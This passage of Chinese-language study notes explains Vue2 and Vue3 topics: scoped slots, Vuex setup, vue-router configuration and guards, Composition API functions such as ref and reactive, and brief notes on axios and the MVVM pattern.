适用：数据在组件自身，但根据数据生成的结构需要组件的使用者来决定。

父组件：`scopeData` 是一个对象，可以使用解构赋值

```js
<template>
  <div>
    <Catogory>
      <template scope="scopeData">
        <ul>
          <li v-for="g in scopeData.games" :key="g">{{g}}</li>
        </ul>
      </template>
    </Catogory>

    <Catogory>
      <template slot-scope="scopeData">
        <ol>
          <li v-for="g in scopeData.games" :key="g">{{g}}</li>
        </ol>
      </template>
    </Catogory>

  </div>
</template>
```

子组件传数据：

```js
<template>
  <div>
    <slot :games="games"></slot>
  </div>
</template>
```

# Vuex 插件

什么时候使用 Vuex ？

1. 多个组件依赖于同一状态
2. 来自不同组件的行为需要变更同一状态

## 工作原理

<Image src="https://vuex.vuejs.org/vuex.png"> Vuex 工作原理 </Image>

`Actions`，`Mutations`，`State` 都是对象，都由 `store` 管理。

1. Actions，这一步请求数据
2. Mutations
3. State

## 搭建 Vuex 环境

1. 安装 `npm i vuex@3`（`npm i vuex` 默认安装最新版本，vue2 使用 vuex3）

引入 vuex，添加 store 配置项：

```js
//main.js
import Vuex from 'vuex'

Vue.use(Vuex)

new Vue({
    el:'#app',
    render:h => h(App),
    store:'hello',
})
```

vm 以及所有 vc 身上都会出现 `$store`。

2. 创建 store

注意：Vue 在执行 main.js 时，会扫描所有 `import` 语句，按照 `import` 的顺序先执行所有与 `import` 相关的文件。

- 在哪创建？`src/vuex/store.js` 或者 `src/store/index.js`

```js
//src/store/index.js
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex)//注意，在创建 Store 实例前，要先执行这个。放在 main.js 里，执行顺序会有问题，所以放在这里

const actions = {}//用于响应组件中的动作
const mutations = {}//用于操作数据 state
const state ={}//用于存储数据

export default new Vuex.Store({//创建并暴露 store
    actions,
    mutations,
    state
})
```
在 main.js 中创建 vm 时传入 `store` 配置项：

```js
//main.js
import store from './store'//引入 store

new Vue({
    el:'#app',
    render:h => h(App),
    store,
})
```

## 使用 Vuex

- 组件模板中读取 vuex 中的数据：`$store.state.xxx`
- 组件中修改 vuex 中的数据：`$store.dispatch('actionName',data)` 或者 `$store.commit('mutationName',data)`（一般 mutation 中的属性名大写）

若没有网络请求或者其他业务逻辑，组件中也可以越过 `actions`，直接 `commit`

### mapState 和 mapGetters

- 对象写法和数组写法

```js
computed: {
...mapState({//借助 mapState 批量生成计算属性，对象写法
    sum:'sum',
    school:'school',
    subject:'subject'
}),
...mapState(["sum", "school", "subject"]),//数组写法
},
```

### mapMutations 和 mapActions

若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象

# 路由器 router 、路由 route

## vue-router 的理解

vue 的一个**插件库**，专门来实现实现单页面应用（ SPA : single page web application ）。

## 对 SPA 的理解

1. 单页面 Web 应用（single page web application, SPA）
2. 整个应用只有**一个完整的页面**
3. 点击页面中的导航连接**不会刷新**页面，只会做页面的**局部更新**
4. 数据需要通过 ajax 请求获取数据

## 路由的理解

- 什么是路由？
  1. 一个路由就是一组映射关系（key - value）
  2. key 为路径，value 可能是 function 或 component


- 路由分类：
  1. 后端路由：
     1) 理解：value 是 function ，用于处理客户端的请求
     2) 工作过程：服务器接收到一个请求时，**根据请求路径**找到匹配的函数来处理请求，返回响应数据
  2. 前端路由：
     1) 理解：value 是 component，用于展示页面内容
     2) 工作过程：当浏览器路径改变时，对应组件就会显示

## 路由的基本使用

注意点：

1. 路由组件通常存放在 pages 文件夹，一般组件通常存放在 components 文件夹
2. 通过切换，" **隐藏** "了的路由组件，默认是被**销毁**的，需要的时候再去挂载
3. 每个组件都有自己的 `$route` 属性，里面存储着自己的路由信息
4. 整个应用只有一个 `router` ，可以通过组件的 `$router` 属性获取到

## 嵌套（多级）路由

配置：

```js
//...
{
    path: '/home',
    component: Home,
    children: [
        {
            path: 'news',
            component: News,
        },
        {
            path: 'message',
            component: Message,
        },
    ]
},
//...
```

跳转路径：

```html
<router-link active-class="active" to="/home/news"> News </router-link>
<router-link active-class="active" to="/home/message"> Message </router-link>
```

## 路由传参

### query 传参

1. 跳转路由并携带 `query` 参数，to 的**字符串**写法：

```js
<router-link :to="`/home/message/detail?id=${m.id}&title=${m.titile}&text=${m.text}`">{{m.text}}</router-link>
```

2. 跳转路由并携带 `query` 参数，to 的**对象**写法：

```js
<router-link :to="{
    path:'/home/message/detail',
    query:{
        id:m.id,
        text:m.text,
        titile:m.titile
    }
}">
{{m.text}}
</router-link>
```

### params 传参

和 query 参数类似，需在路由 path 属性配置占位符:

```js
//...
{
    name:'msg-info',
    path: 'detail/:id/:title/:text',
    component: Detail
}
//...
```

如果使用对象写法，只能使用 name 属性配置路径。


## 命名路由

可以简化跳转：

```js
<router-link :to="{
    name:'msg-info',
    query:{
        id:m.id,
        text:m.text,
        titile:m.titile
    }
}">
{{m.text}}
</router-link>
```

## props 配置

1. props 为对象，对象中的所有 key-value 组合最终会通过 props 传给 Detail 组件
2. props 为布尔值，只把路由收到的所有 **params** 参数通过 props 传递给 Detail 组件
3. props 为函数，接收 `$route` 为参数

## router-link 的 replace 属性

作用：控制路由跳转时操作浏览器记录的模式

## 编程式路由导航

不借助 `router-link` 实现路由跳转，让路由更加灵活。主要使用 vm.$router 实例上的方法：`push`、`replace`、`back`、`forward`、`go`。

## 缓存路由组件 keep-alive

```html
<!-- 一个组件 -->
<keep-alive include="News"><!--组件名-->
    <router-view/>
</keep-alive>

<!-- 或者缓存多个组件 -->
<keep-alive :include="['News','Message']">
    <router-view/>
</keep-alive>

<!-- 缓存所有组件 -->
<keep-alive>
    <router-view/>
</keep-alive>
```

## 钩子：activated、deactivated

路由组件所独有的钩子，用于捕获路由组件的激活状态。

1. `activated` 路由组件被激活时触发，切换组件是否显示，不同于销毁
2. `deactivated` 路由组件失活时触发

补充:`nextTick` 

## 路由守卫

### 全局路由守卫 beforeEach/afterEach

1. 全局前置 router.beforeEach

全局前置路由守卫 - **初始化时**被调用、每次路由切换**前**被调用

- 通过组件名判断授权

```js
router.beforeEach((to,from,next) => {
    if(to.name === 'xiaoxi' || to.name === 'xinwen'){
        if(localStorage.getItem('user') === 'admin') next();
        else alert('不是 admin ，暂无权限')
    }
    else next()
})
```

- 在 `meta` 中配置属性

```js
router.beforeEach((to, from, next) => {
    if (to.meta.isAuth) {
        if (localStorage.getItem('user') === 'admin') next();
        else alert('不是 admin ，暂无权限')
    }
    else next()
})
```

2. 全局后置 router.afterEach

全局后置路由守卫 -** 初始化时**执行、每次路由切换**后**被调用

```js
router.afterEach((to, from) => {
    if (to.meta.title) document.title = to.meta.title || ''
    else document.title = 'vue2-test'

})
```

### 独享路由守卫 beforeEnter

使用和全局前置一样,组件没有独享的后置路由守卫。可以搭配全局后置路由守卫使用。

### 组件内路由守卫 beforeRouteEnter/beforeRouteLeave

- beforeRouteEnter：通过路由规则，**进入**该组件时被调用
- beforeRouteLeave：通过路由规则，**离开**该组件时被调用

注意要与 `beforeEach/afterEach` 区分。

```vue
<script>
export default {
  name: "About",
  data() {
    return {};
  },
  beforeRouteEnter(to,from,next){
    // ...进入规则
    next();
  },
  beforeRouteLeave(to,from,next){
    // ...离开规则
    next();
  }
};
</script>
```

## 路由：hash （#） & history 模式

- hash 值不会包含在 HTTP 请求中，即 hash 值不会带给服务器
- hash ：
  - 兼容性好
  - 地址中有符号：`#`
  - 通过第三方手机 app 分享地址，若 app 校验严格，地址会标记为不合法
- history
  - 地址干净、美观
  - 应用部署上线时需要后端人员支持，解决刷新页面服务端 404 的问题(`connect-history-api-fallback`)

# Vue UI 组件库

# Vue3

## 创建工程

vue-cli 或 vite。

## setup

注意：尽量不要与 Vue2 配置混用
 - Vue2 中的 `data`、`methods`、`computed` 等配置，可以访问到 setup 中的属性、方法
 - setup 中不能访问到 Vue2 的配置
 - 如有重名，setup 优先
 - setup 的返回值必须是单纯的对象，所以不能是 async 函数

## ref

定义一个响应式数据

- 基本数据类型的数据：响应式依然是靠 `Object.defineProperty()` 的 `get` 与 `set` 完成
- 对象类型数据：内部求助 Vue3 的一个新函数 - `reactive`（Proxy）

## reactive

- 作用：定义一个**对象类型**的响应式数据，基本类型不能使用。
- reactive 定义的响应式数据是**深层次的**
- 内部基于 ES6 的 Proxy 实现，通过代理对象操作源对象内部数据进行操作

## Vue2 & Vue3 的响应式原理

Vue2 存在的问题：
- 新增属性、删除属性，界面不会更新
- 直接通过下标修改数组，界面不会自动更新


Vue3 响应式实现原理：

- 通过 Proxy 代理：拦截对象中任意属性的变化，包括：属性值的读写、属性的添加、属性的删除等
- 通过 Reflect 反射：对源对象的属性进行操作

## reactive 与 ref 对比

- 从定义数据角度：
  - ref 用来定义：**基本类型数据**
  - reactive 用来定义：**对象（或数组）类型数据**
  - 备注：ref 也可以用来定义**对象（或数组）类型的数据**，它内部会自动通过 `reactive` 转为**代理对象**

- 从原理角度
  - ref 通过 `Object.defineProperty()` 的 `get` 与 `set` 实现响应式（数据劫持）
  - reactive 通过使用 `Proxy` 来实现响应式（数据劫持），并通过 `Reflect` 操作**源对象**内部的数据

- 从使用角度
  - ref 定义的数据：操作数据**需要** `.value` ，读取数据时模板中直接读取**不需要** `.value`
  - reactive 定义的数据：操作数据与读取数据：均**不需要** `.value`

## Vue3 生命周期

- Vue3 提供的 Composition API 形式的生命周期钩子，与 Vue3.x 中钩子的对应关系如下：
  - beforeCreate、created => setup()
  - beforeMount => onBeforeMount
  - mounted => onMounted
  - beforeUpdate => onBeforeUpdate
  - updated => onUpdated
  - beforeUnmounted => onBeforeUnmount
  - unmounted => onUnmounted

## hook 函数

- hook 函数把 setup 函数中使用的 Composition API（ref、reactiv、计算属性与监视、生命周期钩子） 进行了封装
- 类似 Vue2 中的 mixin
- 优势：复用代码，让 setup 逻辑更清楚易懂

## toRef

- 作用：创建一个 `ref` 对象，其 value 值指向另一个对象中的某个属性
- 语法：`const name = toRef(person,'name')`
- 应用：要将响应式对象中的某个属性单独提供给外部使用时
- 扩展：`toRefs` 与 `toRef` 功能一致，但可以批量创建多个 `ref` 对象，语法：`toRefs(person)`

## shallowReactive 与 shallowRef

- shallowReactive：只处理对象最外层属性的响应式（浅响应式）=> 当对象数据结构比较深，但是只有**最外层属性变化**时使用
- shallowRef：只处理基本数据类型的响应式，不进行对象的响应式处理 => 对于一个对象数据，后续功能不会修改改对象中的属性而是**生成新的对象来替换**时使用

## readOnly & shallowReadonly

- readOnly：让一个响应式数据变为只读的（深只读）
- shallowReadonly：让一个响应式数据变为只读的（浅只读）
- 应用场景：不希望数据被修改时

## toRaw & markRaw

toRaw：

- 作用：将一个由 `reactive` 生成的响应式对象转换为普通对象
- 使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新


markRaw：

- 作用：标记一个对象，使其永远不会再成为响应式数据
- 应用场景
  - 有些值不应被设置为响应式的，例如复杂的**第三方类库**
  - 当渲染具有**不可变数据源的大列表时**，跳过响应式转换可以提高性能

## provide 与 inject

- 作用：实现祖后代组件间通信
- 写法：
  - 祖组件：

    ```js
    setup(){
        let car = reactive({name:'奔驰',price:'40w'})
        provide('car',car)
    }
    ```
  - 后代组件：

    ```js
    setup(){
        const car = inject('car');
        return {car}
    }
    ```

## 响应式数据的判断

- isRef: 检查一个值是否为一个 ref 对象
- isReactive: 检查一个对象是否是由 reactive 创建的响应式代理
- isReadonly: 检查一个对象是否是由 readonly 创建的只读代理
- isProxy: 检查一个对象是否是由 reactive 或者 readonly 方法创建的代理

## Fragment

Vue3 中组件可以没有根标签，内部会将多个标签包含在一个 `Fragment` 虚拟元素中，好处：减少标签层级，减少内存占用。

## Vue3 中的其他改变

- 将全局 API ，即 `Vue.xxx` 调整到应用实例 ( `app` )上

| Vue2                     | Vue3           |
| ------------------------ | -------------- |
| Vue.config.xxx           | app.config.xxx |
| Vue.config.productionTip | 移除           |
| Vue.component            | app.component  |
| Vue.directive            | app.directive  |
| Vue.mixin                | app.mixin      |
| Vue.use                  | app.use        |
| Vue.prototype            | app.prototype  |

- data 选项应始终被声明为一个函数
- 移除 keyCode 作为 `v-on` 的修饰符，同时也不再支持 `config.keyCodes`
- 移除 `v-on.native` 修饰符
- 移除过滤器

# 补充

## axios

axios 和 await 经常结合使用，是基于 HTTP 客户端给浏览器和 node.js 使用的 Promise，[链接直达](https://www.npmjs.com/package/axios)。



## MVVM

> [原文直达](https://www.jianshu.com/p/6aeeecd64dcf)

MVVM（**Model–view–viewmodel**）是一种软件架构模式，MVVM 是 MVC 的增强版，实质上和 MVC 没有本质区别，只是代码的位置变动而已。

1. MVC 简要

MVC（**Model、View、Controller**），分别表示**数据、视图、控制器**，这只是一种设计思想，具体用什么语言和做什么开发并不重要。他们具体是怎么工作的呢？先看下图

<Image src="https://upload-images.jianshu.io/upload_images/2002187-4d82bf5244e9d66e.png?imageMogr2/auto-orient/strip|imageView2/2/w/716/format/webp">Model-View-Controller - Apple Developer</Image>

这张图表明了三者之间的关系，简单描述了三者作用：

- Model：数据模型，用来存储数据
- View：视图界面，用来展示 UI 界面和响应用户交互
- Controller：控制器(大管家角色)，监听模型数据的改变和控制视图行为、处理用户交互

具体可参考[苹果开发者文档](https://developer.apple.com/library/archive/documentation/General/Conceptual/DevPedia-CocoaCore/MVC.html)。

2. MVVM 简要

<Image src="https://upload-images.jianshu.io/upload_images/2002187-ddcaae06ec00dadb.png?imageMogr2/auto-orient/strip|imageView2/2/w/673/format/webp">Model-ViewModel-View-Controller</Image>

上图描述了 MVVM 一个基本结构，比 MVC 架构中多了一个**ViewModel**，这个 ViewModel，他是 MVVM 相对于 MVC 改进的核心思想。


在开发过程中，由于需求的变更或添加，项目的复杂度越来越高，代码量越来越大，此时我们会发现 MVC 维护起来有些吃力。


由于 Controller 主要用来处理**各种逻辑和数据转化**，复杂业务逻辑界面的 Controller 非常庞大，维护困难，所以有人想到**把 Controller 的数据和逻辑处理部分从中抽离出来，用一个专门的对象去管理，这个对象就是 ViewModel，是 Model 和 Controller 之间的一座桥梁**。当人们去尝试这种方式时，发现 Controller 中的代码变得非常少，变得易于测试和维护，只需要 **Controller 和 ViewModel** 做数据绑定即可，这也就催生了 MVVM 的热潮。


## Cookie 的工作原理

<Image src="https://forting.nooooe.cn/20230204222828.png"> Cookie 简略示意图 </Image>
